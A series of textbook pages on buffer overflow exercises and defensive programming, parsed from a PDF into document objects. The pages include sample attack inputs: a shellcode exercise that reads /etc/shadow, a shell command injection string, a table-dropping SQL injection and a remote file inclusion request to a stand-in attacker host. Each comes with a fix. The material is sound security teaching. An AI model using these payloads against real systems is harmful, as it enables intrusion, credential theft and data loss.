library.\\n 10.9 Determine the shellcode needed to implement a return to system call attack that calls \\nsystem(“whoami; cat /etc/shadow; exit;”), targeting the same vulnerable program as \\nused in Problem 10.6. You need to identify the location of the standard library  system() \\nfunction on the target system by tracing a suitable test program with a debugger. You \\nthen need to determine the correct sequence of address and data values to use in the \\nattack string. Experiment with running this attack.\\n 10.10 Rewrite the functions shown in F igure 10.10 so they are no longer vulnerable to a \\n buffer overflow attack.\\n 10.11 Rewrite the program shown in Figure 10.11a so it is no longer vulnerable to a heap \\nbuffer overflow.\\n 10.12 Review some of the recent vulnerability announcements from CERT, SANS, or simi-\\nlar organizations. Identify a number that occur as a result of a buffer overflow attack. \\nClassify the type of buffer overflow used in each, and decide if it is one of the forms \\nwe discuss in this chapter or another variant.\\n 10.13 What are format string attacks? List the format functions defined in the ANSI C stan-\\ndard which can expose an application to this vulnerability. Suggest guidelines to avoid \\nformat string vulnerabilities when developing an application.\\n 10.14 What are integer overflows? What are their security implications? Suggest guidelines \\nto mitigate integer overflow problems.\\nM10_STAL0611_04_GE_C10.indd   378 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 380, 'page_label': '379'}, page_content='379\\n11.1 Software Security Issues\\nIntroducing Software Security and Defensive Programming\\n11.2 Handling Program Input\\nInput Size and Buffer Overflow\\nInterpretation of Program Input\\nValidating Input Syntax\\nInput Fuzzing\\n11.3 Writing Safe Program Code\\nCorrect Algorithm Implementation\\nEnsuring that Machine Language Corresponds to Algorithm\\nCorrect Interpretation of Data Values\\nCorrect Use of Memory\\nPreventing Race Conditions with Shared Memory\\n11.4 Interacting with the Operating System and Other Programs\\nEnvironment Variables\\nUsing Appropriate, Least Privileges\\nSystems Calls and Standard Library Functions\\nPreventing Race Conditions with Shared System Resources\\nSafe Temporary File Use\\nInteracting with Other Programs\\n11.5 Handling Program Output\\n11.6 Key Terms, Review Questions, and Problems\\nSoftware Security\\nCHAPTER \\n \\nM11_STAL0611_04_GE_C11.indd   379 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 381, 'page_label': '380'}, page_content='380  CHAPTER 11 / SofTwARE SECuRiTy\\nIn Chapter 10, we described the problem of buffer overflows, which continue to be \\none of the most common and widely exploited software vulnerabilities. Although we \\ndiscuss a number of countermeasures, the best defense against this threat is not to \\nallow it to occur at all. That is, programs need to be written securely to prevent such \\nvulnerabilities occurring.\\nMore generally, buffer overflows are just one of a range of deficiencies found \\nin poorly written programs. There are many vulnerabilities related to program defi-\\nciencies that result in the subversion of security mechanisms and allow unauthorized \\naccess and use of computer data and resources.\\nThis chapter explores the general topic of software security . We introduce a \\nsimple model of a computer program that helps identify where security concerns may \\noccur. We then explore the key issue of how to correctly handle program input to \\nprevent many types of vulnerabilities and, more generally, how to write safe program \\ncode and manage the interactions with other programs and the operating system.\\n 11.1 SOFTWARE SECURITY ISSUES\\nIntroducing Software Security and Defensive Programming\\nMany computer security vulnerabilities result from poor programming practices, which \\nthe Veracode State of Software Security Report [VERA16] notes are far more preva-\\nlent than most people think. The CWE/SANS Top 25 Most Dangerous  Software Errors \\nlist, summarized in Table 11.1, details the consensus view on the poor programming \\npractices that are the cause of the majority of cyber attacks. These errors are grouped \\ninto three categories: insecure interaction between components, risky resource man-\\nagement, and porous defenses. Similarly, the Open Web Application Security Project \\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Describe how many computer security vulnerabilities are a result of poor \\nprogramming practices.\\n ◆ Describe an abstract view of a program, and detail where potential points of \\nvulnerability exist in this view.\\n ◆ Describe how a defensive programming approach will always validate any \\nassumptions made, and is designed to fail gracefully and safely whenever \\nerrors occur.\\n ◆ Detail the many problems that occur as a result of incorrectly handling pro-\\ngram input, failing to check its size or interpretation.\\n ◆ Describe problems that occur in implementing some algorithm.\\n ◆ Describe problems that occur as a result of interaction between programs \\nand O/S components.\\n ◆ Describe problems that occur when generating program output.\\nM11_STAL0611_04_GE_C11.indd   380 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 382, 'page_label': '381'}, page_content='11.1 / SofTwARE SECuRiTy iSSuES  381\\nTop Ten [OWAS13] list of critical Web application security flaws includes five related \\nto insecure software code. These include unvalidated input, cross-site scripting, buffer \\noverflow, injection flaws, and improper error handling. These flaws occur as a conse-\\nquence of insufficient checking and validation of data and error codes in programs. We \\nwill discuss most of these flaws in this chapter. Awareness of these issues is a critical \\ninitial step in writing more secure program code. Both these sources emphasize the need \\nfor software developers to address these known areas of concern, and provide guidance \\non how this is done. The NIST report NISTIR 8151 (Dramatically Reducing Software \\nVulnerabilities,  October\\xa02016) presents a range of approaches with the aim of dramati-\\ncally reducing the number of software vulnerabilities. It recommends the following:\\n• Stopping vulnerabilities befor e they occur by using improved methods for \\nspecifying and building software.\\n• Finding vulnerabilities before they can be exploited by using better and more \\nefficient testing techniques.\\n• Reducing the impact of vulnerabilities by building more resilient architectures.\\nSoftware security is closely related to software quality and reliability, but with \\nsubtle differences. Software quality and reliability is concerned with the accidental \\nSoftware Error Category: Insecure Interaction Between Components\\nImproper Neutralization of Special Elements used in an SQL Command (“SQL Injection”)\\nImproper Neutralization of Special Elements used in an OS Command (“OS Command \\nInjection”)\\nImproper Neutralization of Input During Web Page Generation (“Cross-site Scripting”)\\nUnrestricted Upload of File with Dangerous Type\\nCross-Site Request Forgery (CSRF)\\nURL Redirection to Untrusted Site (“Open Redirect”)\\nSoftware Error Category: Risky Resource Management\\nBuffer Copy without Checking Size of Input (“Classic Buffer Overflow”)\\nImproper Limitation of a Pathname to a Restricted Directory (“Path Traversal”)\\nDownload of Code Without Integrity Check\\nInclusion of Functionality from Untrusted Control Sphere\\nUse of Potentially Dangerous Function\\nIncorrect Calculation of Buffer Size\\nUncontrolled Format String\\nInteger Overflow or Wraparound\\nSoftware Error Category: Porous Defenses\\nMissing Authentication for Critical Function\\nMissing Authorization\\nUse of Hard-coded Credentials\\nMissing Encryption of Sensitive Data\\nReliance on Untrusted Inputs in a Security Decision\\nExecution with Unnecessary Privileges\\nIncorrect Authorization\\nIncorrect Permission Assignment for Critical Resource\\nUse of a Broken or Risky Cryptographic Algorithm\\nImproper Restriction of Excessive Authentication Attempts\\nUse of a One-Way Hash without a Salt\\nTable 11.1 CWE/SANS TOP 25 Most Dangerous Software Errors (2011)\\nM11_STAL0611_04_GE_C11.indd   381 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 383, 'page_label': '382'}, page_content='382  CHAPTER 11 / SofTwARE SECuRiTy\\nfailure of a program as a result of some theoretically random, unanticipated input, \\nsystem interaction, or use of incorrect code. These failures are expected to follow \\nsome form of probability distribution. The usual approach to improve software qual-\\nity is to use some form of structured design and testing to identify and eliminate as \\nmany bugs as is reasonably possible from a program. The testing usually involves \\nvariations of likely inputs and common errors, with the intent of minimizing the num-\\nber of bugs that would be seen in general use. The concern is not the total number \\nof bugs in a program, but how often they are triggered, resulting in program failure.\\nSoftware security differs in that the attacker chooses the probability distri -\\nbution, targeting specific bugs that result in a failure that can be exploited by the \\nattacker. These bugs may often be triggered by inputs that differ dramatically from \\nwhat is usually expected, and hence are unlikely to be identified by common test -\\ning approaches. Writing secure, safe code requires attention to all aspects of how a \\nprogram executes, the environment it executes in, and the type of data it processes. \\nNothing can be assumed, and all potential errors must be checked. These issues are \\nhighlighted in the following definition:\\nDefensive or Secure Programming  is the process of designing and implement -\\ning software so it continues to function even when under attack. Software writ -\\nten using this process is able to detect erroneous conditions resulting from some \\nattack, and to either continue executing safely, or to fail gracefully. The key rule in \\ndefensive programming is to never assume anything, but to check all assumptions \\nand to handle any possible error states.\\nThis definition emphasizes the need to make explicit any assumptions about how a \\nprogram will run, and the types of input it will process. To help clarify the issues, con-\\nsider the abstract model of a program shown in Figure 11.1.1 This illustrates the concepts \\ntaught in most introductory programming courses. A program reads input data from a \\nvariety of possible sources, processes that data according to some  algorithm then gener-\\nates output, possibly to multiple different destinations. It executes in the environment \\nprovided by some operating system, using the machine instructions of some specific \\nprocessor type. While processing the data, the program will use system calls, and pos-\\nsibly other programs available on the system. These may result in data being saved or \\nmodified on the system or cause some other side effect as a result of the program \\n execution. All of these aspects can interact with each other, often in complex ways.\\nWhen writing a program, programmers typically focus on what is needed to \\nsolve whatever problem the program addresses. Hence their attention is on the steps \\nneeded for success and the normal flow of execution of the program rather than \\nconsidering every potential point of failure. They often make assumptions about the \\ntype of inputs a program will receive and the environment it executes in. Defensive \\nprogramming means these assumptions need to be validated by the program and \\nall potential failures handled gracefully and safely. Correctly anticipating, checking, \\n1This figure expands and elaborates on Figure 1 -1 in [WHEE03].\\nM11_STAL0611_04_GE_C11.indd   382 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 384, 'page_label': '383'}, page_content='11.1 / SofTwARE SECuRiTy iSSuES  383\\nand handling all possible errors will certainly increase the amount of code needed \\nin, and the time taken to write, a program. This conflicts with business pressures to \\nkeep development times as short as possible to maximize market advantage. Unless \\nsoftware security is a design goal, addressed from the start of program development, \\na secure program is unlikely to result.\\nFurther, when changes are required to a program, the programmer often focuses \\non the changes required and what needs to be achieved. Again, defensive program-\\nming means that the programmer must carefully check any assumptions made, check \\nand handle all possible errors, and carefully check any interactions with existing code. \\nFailure to identify and manage such interactions can result in incorrect program \\nbehavior and the introduction of vulnerabilities into a previously secure program.\\nDefensive programming thus requires a changed mindset to traditional pro -\\ngramming practices, with their emphasis on programs that solve the desired problem \\nfor most users, most of the time. This changed mindset means the programmer needs \\nan awareness of the consequences of failure and the techniques used by attackers. \\nParanoia is a virtue, because the enormous growth in vulnerability reports really does \\nshow that attackers are out to get you! This mindset has to recognize that normal \\ntesting techniques will not identify many of the vulnerabilities that may exist but that \\nare triggered by highly unusual and unexpected inputs. It means that lessons must be \\nlearned from previous failures, ensuring that new programs will not suffer the same \\nweaknesses. It means that programs should be engineered, as far as possible, to be \\nas resilient as possible in the face of any error or unexpected condition. Defensive \\nprogrammers have to understand how failures can occur and the steps needed to \\nreduce the chance of them occurring in their programs.\\nThe necessity for security and reliability to be design goals from the inception of \\na project has long been recognized by most engineering disciplines. Society in general \\nis intolerant of bridges collapsing, buildings falling down, or airplanes crashing. The \\ndesign of such items is expected to provide a high likelihood that these catastrophic \\nFigure 11.1 Abstract View of Program\\nDatabase\\nMachine Hardware\\nOperating System\\nDBMS\\nOther\\nprograms\\nFile System\\nNetwork Link\\nProgram\\nGUI Display\\nKeyboard\\n& Mouse\\nExecuting algorithm,\\nprocessing input data,\\ngenerating output\\nComputer System\\nM11_STAL0611_04_GE_C11.indd   383 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 385, 'page_label': '384'}, page_content='384  CHAPTER 11 / SofTwARE SECuRiTy\\nevents will not occur. Software development has not yet reached this level of matu-\\nrity, and society tolerates far higher levels of failure in software than it does in other \\nengineering disciplines. This is despite the best efforts of software engineers and the \\ndevelopment of a number of software development and quality standards such as ISO \\n12207 (Information technology - Software lifecycle processes, 1997) or [SEI06]. While \\nthe focus of these standards is on the general software development life cycle, they \\nincreasingly identify security as a key design goal. Recent years have seen increasing \\nefforts to improve secure software development processes. The Software Assurance \\nForum for Excellence in Code (SAFECode), with a number of major IT industry \\ncompanies as members, develop publications outlining industry best practices for \\nsoftware assurance and providing practical advice for implementing proven methods \\nfor secure software development, including [SIMP11]. We will discuss many of their \\nrecommended software security practices in this chapter.\\nHowever, the broader topic of software development techniques and  standards, \\nand the integration of security with them, is well beyond the scope of this text. \\n[MCGR06] and [VIEG01] provide much greater detail on these topics. [SIMP11] rec-\\nommends incorporating threat modeling, also known as risk analysis, as part of the \\ndesign process. We will discuss this area more generally in Chapter 14. Here, we explore \\nsome specific software security issues that should be incorporated into a wider develop-\\nment methodology. We examine the software security concerns of the various interac-\\ntions with an executing program, as illustrated in Figure 11.1. We start with the critical \\nissue of safe input handling, followed by security concerns related to algorithm imple-\\nmentation, interaction with other components, and program output. When looking at \\nthese potential areas of concern, it is worth acknowledging that many security vulner-\\nabilities result from a small set of common mistakes. We discuss a number of these.\\nThe examples in this chapter focus primarily on problems seen in Web applica-\\ntion security. The rapid development of such applications, often by developers with \\ninsufficient awareness of security concerns, and their accessibility via the Internet to \\na potentially large pool of attackers mean these applications are particularly vulner-\\nable. However, we emphasize that the principles discussed apply to all programs. \\nSafe programming practices should always be followed, even for seemingly innocuous \\nprograms, because it is very difficult to predict the future uses of programs. It is always \\npossible that a simple utility, designed for local use, may later be incorporated into a \\nlarger application, perhaps Web-enabled, with significantly different security concerns.\\n 11.2 HANDLING PROGRAM INPUT\\nIncorrect handling of program input is one of the most common failings in  software \\nsecurity. Program input refers to any source of data that originates outside the \\n program and whose value is not explicitly known by the programmer when the code \\nwas written. This obviously includes data read into the program from user keyboard \\nor mouse entry, files, or network connections. However, it also includes data supplied \\nto the program in the execution environment, the values of any configuration or other \\ndata read from files by the program, and values supplied by the operating system \\nto the program. All sources of input data, and any assumptions about the size and \\ntype of values they take, have to be identified. Those assumptions must be explicitly \\nM11_STAL0611_04_GE_C11.indd   384 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 386, 'page_label': '385'}, page_content='11.2 / HANDLiNG PRoGRAM iNPuT  385\\nverified by the program code, and the values must be used in a manner consistent \\nwith these assumptions. The two key areas of concern for any input are the size of \\nthe input and the meaning and interpretation of the input.\\nInput Size and Buffer Overflow\\nWhen reading or copying input from some source, programmers often make assump-\\ntions about the maximum expected size of input. If the input is text entered by the \\nuser, either as a command-line argument to the program or in response to a prompt \\nfor input, the assumption is often that this input would not exceed a few lines in size. \\nConsequently, the programmer allocates a buffer of typically 512 or 1024 bytes to \\nhold this input but often does not check to confirm that the input is indeed no more \\nthan this size. If it does exceed the size of the buffer, then a buffer overflow occurs, \\nwhich can potentially compromise the execution of the program. We discussed the \\nproblems of buffer overflows in detail in Chapter 10. Testing of such programs may \\nwell not identify the buffer overflow vulnerability, as the test inputs provided would \\nusually reflect the range of inputs the programmers expect users to provide. These test \\ninputs are unlikely to include sufficiently large inputs to trigger the overflow, unless \\nthis vulnerability is being explicitly tested.\\nA number of widely used standard C library routines, some listed in Table 10.2, \\ncompound this problem by not providing any means of limiting the amount of data \\ntransferred to the space available in the buffer. We discuss a range of safe program-\\nming practices related to preventing buffer overflows in Section 10.2. These include \\nthe use of safe string and buffer copying routines, and an awareness of these software \\nsecurity traps by programmers.\\nWriting code that is safe against buffer overflows requires a mindset that \\nregards any input as dangerous and processes it in a manner that does not expose \\nthe program to danger. With respect to the size of input, this means either using a \\ndynamically sized buffer to ensure that sufficient space is available or processing the \\ninput in buffer sized blocks. Even if dynamically sized buffers are used, care is needed \\nto ensure that the space requested does not exceed available memory. Should this \\noccur, the program must handle this error gracefully. This may involve processing the \\ninput in blocks, discarding excess input, terminating the program, or any other action \\nthat is reasonable in response to such an abnormal situation. These checks must apply \\nwherever data whose value is unknown enter, or are manipulated by, the program. \\nThey must also apply to all potential sources of input.\\nInterpretation of Program Input\\nThe other key concern with program input is its meaning and interpretation.  Program \\ninput data may be broadly classified as textual or binary. When processing binary data, \\nthe program assumes some interpretation of the raw binary values as  representing \\nintegers, floating-point numbers, character strings, or some more complex structured \\ndata representation. The assumed interpretation must be validated as the binary \\nvalues are read. The details of how this is done will depend very much on the\\xa0par -\\nticular interpretation of encoding of the information. As an example, consider the \\ncomplex binary structures used by network protocols in Ethernet frames, IP packets, \\nand TCP segments, which the networking code must carefully construct and validate. \\nM11_STAL0611_04_GE_C11.indd   385 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 387, 'page_label': '386'}, page_content='386  CHAPTER 11 / SofTwARE SECuRiTy\\nAt a higher layer, DNS, SNMP , NFS, and other protocols use binary encoding of the \\nrequests and responses exchanged between parties using these protocols. These are \\noften specified using some abstract syntax language, and any specified values must \\nbe validated against this specification.\\nThe 2014 Heartbleed OpenSSL bug, which we will discuss further in Section \\n22.3, is a recent example of a failure to check the validity of a binary input value. \\nBecause of a coding error, failing to check the amount of data requested for return \\nagainst the amount supplied, an attacker could access the contents of adjacent mem-\\nory. This memory could contain information such as user names and passwords, pri-\\nvate keys, and other sensitive information. This bug potentially compromised a very \\nlarge numbers of servers and their users. It is an example of a buffer over-read.\\nMore commonly, programs process textual data as input. The raw binary values \\nare interpreted as representing characters, according to some character set. Tradi -\\ntionally, the ASCII character set was assumed, although common systems like Win-\\ndows and MacOS both use different extensions to manage accented characters. With \\nincreasing internationalization of programs, there is an increasing variety of character \\nsets being used. Care is needed to identify just which set is being used, and hence just \\nwhat characters are being read.\\nBeyond identifying which characters are input, their meaning must be identi -\\nfied. They may represent an integer or floating-point number. They might be a file-\\nname, a URL, an e-mail address, or an identifier of some form. Depending on how \\nthese inputs are used, it may be necessary to confirm that the values entered do \\nindeed represent the expected type of data. Failure to do so could result in a vulner-\\nability that permits an attacker to influence the operation of the program, with pos-\\nsibly serious consequences.\\nTo illustrate the problems with interpretation of textual input data, we first \\ndiscuss the general class of injection attacks that exploit failure to validate the inter-\\npretation of input. We then review mechanisms for validating input data and the \\nhandling of internationalized inputs using a variety of character sets.\\nInjectIon AttAcks The term injection attack refers to a wide variety of program \\nflaws related to invalid handling of input data. Specifically, this problem occurs when \\nprogram input data can accidentally or deliberately influence the flow of execution \\nof the program. There are a wide variety of mechanisms by which this can occur. One \\nof the most common is when input data are passed as a parameter to another helper \\nprogram on the system, whose output is then processed and used by the original pro-\\ngram. This most often occurs when programs are developed using scripting languages \\nsuch as Perl, PHP , python, sh, and many others. Such languages encourage the reuse \\nof other existing programs and system utilities where possible to save coding effort. \\nThey may be used to develop applications on some system. More commonly, they \\nare now often used as Web CGI scripts to process data supplied from HTML forms.\\nConsider the example perl CGI script shown in Figure 11.2a, which is designed \\nto return some basic details on the specified user using the UNIX finger command. \\nThis script would be placed in a suitable location on the Web server and invoked in \\nresponse to a simple form, such as that shown in Figure 11.2b. The script retrieves the \\ndesired information by running a program on the server system, and returning the \\noutput of that program, suitably reformatted if necessary, in a HTML webpage. \\nM11_STAL0611_04_GE_C11.indd   386 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 388, 'page_label': '387'}, page_content='11.2 / HANDLiNG PRoGRAM iNPuT  387\\n1 #!/usr/bin/perl\\n2 # finger.cgi - finger CGI script using Perl5 CGI module\\n3\\n4 use CGI;\\n5 use CGI::Carp qw(fatalsToBrowser);\\n6 $q = new CGI; # create query object\\n7\\n8 # display HTML header\\n9 print $q->header,\\n10 $q->start_html(\\'Finger User\\'),\\n11 $q->h1(\\'Finger User\\');\\n12 print \"<pre>\";\\n13\\n14 # get name of user and display their finger details\\n15 $user = $q->param(\"user\");\\n16 print `/usr/bin/finger -sh $user`;\\n17\\n18 # display HTML footer\\n19 print \"</pre>\";\\n20 print $q->end_html;\\nFigure 11.2 A Web CGI Injection Attack\\n(a) Unsafe Perl finger CGI script\\n(b) Finger form\\n(c) Expected and subverted finger CGI responses\\n(d) Safety extension to Perl finger CGI script\\n<html><head><title>Finger User</title></head><body>\\n<h1>Finger User</h1>\\n<form method=post action=\"finger.cgi\">\\n<b>Username to finger</b>: <input type=text name=user value=\"\">\\n<p><input type=submit value=\"Finger User\">\\n</form></body></html>\\nFinger User \\nLogin Name   TTY Idle Login Time Where\\nlpb Lawrie Brown  p0 Sat 15:24 ppp41.grapevine\\nFinger User \\nattack success\\n-rwxr-xr-x 1 lpb staff 537 Oct 21 16:19 finger.cgi\\n-rw-r--r-- 1 lpb staff 251 Oct 21 16:14 finger.html\\n14 # get name of user and display their finger details\\n15 $user = $q->param(\"user\");\\n16 die \"The specified user contains illegal characters!\"\\n17 unless ($user =~ /^\\\\w+$/);\\n18 print `/usr/bin/finger -sh $user`;\\nM11_STAL0611_04_GE_C11.indd   387 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 389, 'page_label': '388'}, page_content='388  CHAPTER 11 / SofTwARE SECuRiTy\\nThis\\xa0type of simple form and associated handler were widely seen and were often pre-\\nsented as simple examples of how to write and use CGI scripts. Unfortunately, this script \\ncontains a critical vulnerability. The value of the user is passed directly to the finger \\nprogram as a parameter. If the identifier of a legitimate user is supplied, for example, \\nlpb, then the output will be the information on that user, as shown first in Figure 11.2c. \\nHowever, if an attacker provides a value that includes shell metacharacters, 2 for \\n example, xxx; echo attack success; ls -l finger*, then the result is shown \\nin Figure 11.2c. The attacker is able to run any program on the system with the privileges \\nof the Web server. In this example, the extra commands were just to display a message \\nand list some files in the Web directory. But any command could be used.\\nThis is known as a command injection attack, because the input is used in the con-\\nstruction of a command that is subsequently executed by the system with the privileges \\nof the Web server. It illustrates the problem caused by insufficient checking of program \\ninput. The main concern of this script’s designer was to provide Web access to an exist-\\ning system utility. The expectation was that the input supplied would be the login or \\nname of some user, as it is when a user on the system runs the finger program. Such a \\nuser could clearly supply the values used in the command injection attack, but the result \\nis to run the programs with their existing privileges. It is only when the Web interface \\nis provided, where the program is now run with the privileges of the Web server but \\nwith parameters supplied by an unknown external user, that the security concerns arise.\\nTo counter this attack, a defensive programmer needs to explicitly identify any \\nassumptions as to the form of input and to verify that any input data conform to those \\nassumptions before any use of the data. This is usually done by comparing the input \\ndata to a pattern that describes the data’s assumed form and rejecting any input that \\nfails this test. We discuss the use of pattern matching in the subsection on input vali-\\ndation later in this section. A suitable extension of the vulnerable finger CGI script \\nis shown in Figure 11.2d. This adds a test that ensures that the user input contains just \\nalphanumeric characters. If not, the script terminates with an error message specify-\\ning that the supplied input contained illegal characters.3 Note that while this example \\nuses Perl, the same type of error can occur in a CGI program written in any language. \\nWhile the solution details differ, they all involve checking that the input matches \\nassumptions about its form.\\nAnother widely exploited variant of this attack is SQL injection, that we intro-\\nduced and described in chapter 5.4. In this attack, the user-supplied input is used \\nto construct a SQL request to retrieve information from a database. Consider the \\nexcerpt of PHP code from a CGI script shown in Figure 11.3a. It takes a name pro-\\nvided as input to the script, typically from a form field similar to that shown in Figure \\n11.2b. It uses this value to construct a request to retrieve the records relating to that \\nname from the database. The vulnerability in this code is very similar to that in the \\ncommand injection example. The difference is that SQL metacharacters are used, \\nrather than shell metacharacters. If a suitable name is provided, for example, Bob, \\n2Shell metacharacters are used to separate or combine multiple commands. In this example, the ‘;’ separates \\ndistinct commands, run in sequence.\\n3The use of die to terminate a Perl CGI is not recommended. It is used here for brevity in the example. \\nHowever, a well-designed script should display a rather more informative error message about the problem \\nand suggest that the user go back and correct the supplied input.\\nM11_STAL0611_04_GE_C11.indd   388 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 390, 'page_label': '389'}, page_content='11.2 / HANDLiNG PRoGRAM iNPuT  389\\nthen the code works as intended, retrieving the desired record. However, an input \\nsuch as Bob\\'; drop table suppliers  results in the specified record being \\nretrieved, followed by deletion of the entire table! This would have rather unfor -\\ntunate consequences for subsequent users. To prevent this type of attack, the input \\nmust be validated before use. Any metacharacters must either be escaped, canceling \\ntheir effect, or the input rejected entirely. Given the widespread recognition of SQL \\ninjection attacks, many languages used by CGI scripts contain functions that can \\nsanitize any input that is subsequently included in a SQL request. The code shown in \\nFigure 11.3b illustrates the use of a suitable PHP function to correct this vulnerability. \\nAlternatively, rather than constructing SQL statements directly by concatenating \\nvalues, recent advisories recommend the use of SQL placeholders or parameters to \\nsecurely build SQL statements. Combined with the use of stored procedures, this can \\nresult in more robust and secure code.\\nA third common variant is the code injection attack, where the input includes \\ncode that is then executed by the attacked system. Many of the buffer overflow exam-\\nples we discussed in Chapter 10 include a code injection component. In those cases, \\nthe injected code is binary machine language for a specific computer system. How -\\never, there are also significant concerns about the injection of scripting language code \\ninto remotely executed scripts. Figure 11.4a illustrates a few lines from the start of a \\n$name = $_REQUEST[\\'name\\'];\\n$query = \"SELECT * FROM suppliers WHERE name = \\'\" . $name . \"\\';\";\\n$result = mysql_query($query);\\nFigure 11.3 SQL Injection Example\\n(b) Safer PHP code\\n$name = $_REQUEST[\\'name\\'];\\n$query = \"SELECT * FROM suppliers WHERE name = \\'\" .\\nmysql_real_escape_string($name) . \"\\';\";\\n$result = mysql_query($query);\\n(a) Vulnerable PHP code\\nFigure 11.4 PHP Code Injection Example\\n(a) Vulnerable PHP code\\n(b) HTTP exploit request\\nGET /calendar/embed/day.php?path=http://hacker.web.site/hack.txt?&cmd=ls\\n<?php\\ninclude $path . \\'functions.php\\';\\ninclude $path . \\'data/prefs.php\\';\\n...\\nM11_STAL0611_04_GE_C11.indd   389 10/11/17   3:02 PM'),\n",
